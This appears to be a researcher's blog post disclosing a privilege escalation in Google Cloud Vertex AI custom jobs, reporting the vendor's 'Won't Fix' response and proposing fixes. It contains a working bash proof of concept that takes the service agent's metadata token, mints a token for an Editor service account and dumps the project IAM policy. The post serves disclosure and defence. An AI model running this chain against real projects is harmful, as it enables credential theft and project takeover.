---
title: "Fine-tune an LLM on Vertex AI, own the whole GCP project"
date: 2026-06-16
tags: ["security", "gcp", "vertex-ai", "privilege-escalation", "vrp", "disclosure", "ai-security"]
author: "Himanshu Anand"
draft: false
---


If your team trains models or fine tunes LLMs on Vertex AI, one training permission is all it takes to take over the whole project.

TLDR;

A principal with one permission `aiplatform.customJobs.create` can run code as google's managed Custom Code Service Agent, which hands out a cloud platform token (the exact scope Google's docs says it can't have) and can mint tokens for any service account in the project. That is low priv ML role turning into effective project Editor, no actAs, no user interaction.

It's the same primitive published by **Unit 42 (Ofir Balassiano & Ofir Shaty) on November 12, 2024** - [*ModeLeak: Privilege Escalation to LLM Model Exfiltration in Vertex AI*](https://unit42.paloaltonetworks.com/privilege-escalation-llm-model-exfil-vertex-ai/). Guess what, it still works. Google marked my report "Won't Fix (Infeasible)" for lacking a "reproducible proof of concept" on a report that is mostly reproducible proof of concept.

the one permission

Vertex AI custom jobs are simple: hand Google a container, Google runs it. The catch is who it runs as. By default that's a Google-managed identity:

```
service-<PROJECT_NUMBER>@gcp-sa-aiplatform-cc.iam.gserviceaccount.com
```

Your code Google's identity. To submit a job you essentially need one meaningful permission, aiplatform.customJobs.create, the thing orgs hand to every data scientist. You do not need actAs, getAccessToken, a token-creator role, Editor, or Owner. So I built exactly that: a custom role with customJobs.create/get/list + locations.get, bound to a fresh service account with rights over nothing else. An intern badge.

the docs literally say this is impossible

This is the whole bug. From Google's own custom service account docs (https://cloud.google.com/vertex-ai/docs/general/custom-service-account):

"If you want your custom training code to obtain an OAuth 2.0 access token with the https://www.googleapis.com/auth/cloud-platform scope, then you must use a custom service account for training. You can't give this level of access to the … Custom Code Service Agent."

The default agent cannot have cloud platform scope. That promise is the reason `customJobs.create` is supposedly safe to hand out. The promise is false.

![Anakin and Padme: the agent can't get cloud-platform scope, right?](https://blog.himanshuanand.com/images/google_cloud_customjob_Anakin.jpg)

so I did it

The "training code" is just a shell script that interrogates the metadata server and tries things it shouldn't be allowed to:

```bash
T1=$(curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
  | python3 -c "import sys,json;print(json.load(sys.stdin)['access_token'])")

# mint a token for the Editor-level Compute SA (should fail)
T2=$(curl -s -X POST -H "Authorization: Bearer $T1" -H "Content-Type: application/json" \
  "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/$COMPUTE_SA:generateAccessToken" \
  -d '{"scope":["https://www.googleapis.com/auth/cloud-platform"]}' \
  | python3 -c "import sys,json;print(json.load(sys.stdin).get('accessToken',''))")

# read the entire project IAM policy with that minted token
curl -s -X POST -H "Authorization: Bearer $T2" -H "Content-Type: application/json" \
  "https://cloudresourcemanager.googleapis.com/v1/projects/$PROJECT:getIamPolicy" -d '{}'
```

Submitted it as the intern-badge SA (--impersonate-service-account=$VX), then made tea while Vertex committed the crime in the background, with full Cloud Logging.

what came back

tokeninfo on the agent's own metadata token, the scope the docs deny exists:

```json
{ "scope": "email https://www.googleapis.com/auth/userinfo.email https://www.googleapis.com/auth/cloud-platform",
  "email": "service-81466905344@gcp-sa-aiplatform-cc.iam.gserviceaccount.com" }
```

And the rest of the chain, straight from the logs:

```
generateAccessToken for Compute Editor SA: HAS_TOKEN: True
getIamPolicy on source project: GETIAMPOLICY_OK bindings= 14
Appspot Editor SA impersonation: APPSPOT_IMPERSONATE_OK
```

So: minimal ML permission -> managed agent -> impossible cloud-platform token -> impersonate any SA -> read the whole project -> effective Editor. It even chained into a second Editor SA, because why stop at one.

![they don't know I only have customJobs.create](https://blog.himanshuanand.com/images/google_cloud_customjob_loner_guy.jpg)

hasn't someone seen this already?

Yes. This is functionally ModeLeak Primitive #1, published by Unit 42 in November 2024. Same shape, same agent, same escalation. Google publicly said they "implemented fixes to eliminate these specific issues." It's 2026 and the door is still open. Fix didn't cover it, was incomplete, or regressed. Pick one.

![ModeLeak 2024 vs my 2026 report, same bug](https://blog.himanshuanand.com/images/google_cloud_customjob_spiderman.jpg)

I mentioned in my bug report to Google

I filed it with the Cloud VRP, flagged the prior art explicitly and linked the tracker → https://issuetracker.google.com/issues/522648848. I included the role YAML, the gcloud commands, the probe config, the captured output and three job IDs. The verdict:

Status: Won't Fix (Infeasible).

Hi, Our team has analyzed this report and decided not to track it as a security bug. … At this time, we have not seen a reproducible proof of concept that demonstrates how this issue could be exploited to attack Google or other users. Without a clear demonstration of such impact, we are unable to prioritize this as a security-related fix.

![Google's Won't Fix Infeasible response](https://blog.himanshuanand.com/images/google_response_customjob.jpg)

The report contains the exact commands, the captured tokeninfo, a successful generateAccessToken against an Editor SA, a getIamPolicy on the whole project, and three job IDs you can pull from Cloud Logging. I reproduced it three times. The job IDs are literally labeled baseline, low-priv, and decisive. "No reproducible proof of concept" is a bold review for a report you can copy-paste.

The real gripe is not the bounty, it is setting the bar at "demonstrate cross-tenant attack on Google" for a single-tenant privesc primitive. Escalating inside my own project is what a privesc is. The same path runs anywhere customJobs.create is delegated, which is nearly everywhere.

![clown makeup: still no reproducible PoC](https://blog.himanshuanand.com/images/google_customjob_clown.jpg)

why it matters, and the fix

Orgs hand customJobs.create to ML engineers believing the docs, which scope the blast radius to "editor-level access to GCS and BigQuery." The real radius: impersonate any SA, dump the full IAM policy, inherit Editor (Compute, KMS, Secret Manager, networking), exfiltrate the minted tokens. The defenders' mental model is the documented one, and the documented one is wrong.

The fix isn't exotic, pick any:
1. Strip getAccessToken/signJwt/signBlob from roles/aiplatform.customCodeServiceAgent.
2. Add an actAs gate like Cloud Functions and Cloud Build already require. This is solved one product over.
3. Honor the docs: don't give the agent cloud-platform by default.
4. At minimum, fix the docs so customers stop trusting a boundary that isn't there.

final thoughts

A managed Google identity is quietly carrying a token its own documentation calls impossible, handing project-Editor to anyone with one ML permission, via a primitive a major team already published, and the official position is that it's "Infeasible."

If you run GCP: go check what your custom-job submitters can actually reach. Don't trust the GCS-and-BigQuery framing. Spin up the probe in a throwaway project and read your own tokeninfo. Ten minutes and a cup of tea.

If you think I'm wrong about the severity, especially hit me up (https://x.com/anand_himanshu). I'd love to hear the case for "Infeasible."

Thanks for reading.
